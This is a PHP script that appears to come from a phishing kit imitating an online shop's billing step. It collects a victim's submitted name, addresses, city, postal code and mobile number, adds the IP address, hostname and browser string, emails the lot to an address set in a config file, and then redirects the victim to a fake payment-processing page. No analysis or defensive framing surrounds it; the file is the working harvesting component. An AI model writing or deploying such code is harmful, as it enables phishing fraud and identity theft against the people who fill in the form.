<?php
include("../config.php");
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$pes .= "------------+| It's now easier to shop |+------------\n";

$pes .= "Full Name          : ".$_POST['bila1']."\n";
$pes .= "Address 1          : ".$_POST['bila2']."\n";
$pes .= "Address 2          : ".$_POST['bila3']."\n";
$pes .= "City               : ".$_POST['bila4']."\n";
$pes .= "Zip Code           : ".$_POST['bila5']."\n";
$pes .= "Mobile N²          : ".$_POST['bila6']."\n";

$pes .= "------------+| We offer free global returns with pick-up service. |+------------\n";
$pes .= "Fr0m $ip chek in http://www.geoiptool.com/?IP=$ip   \n";
$pes .= "System Down :  $useragent   \n";


$bilsub = "iBill LS $ip";
$bilhead = "From: Customer LS <prodection@bader.com>";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead = "X-Mailer: PHP/".phpversion();
$bilhead .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$bilhead .= "MIME-Version: 2.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$pes,$bilhead);

header("Location: ../vres.php?Go=_Payment_loa_Processing&_SESSION=d2b1a896a29a6af53a2f0d23f0c705e2ee17233d");
?>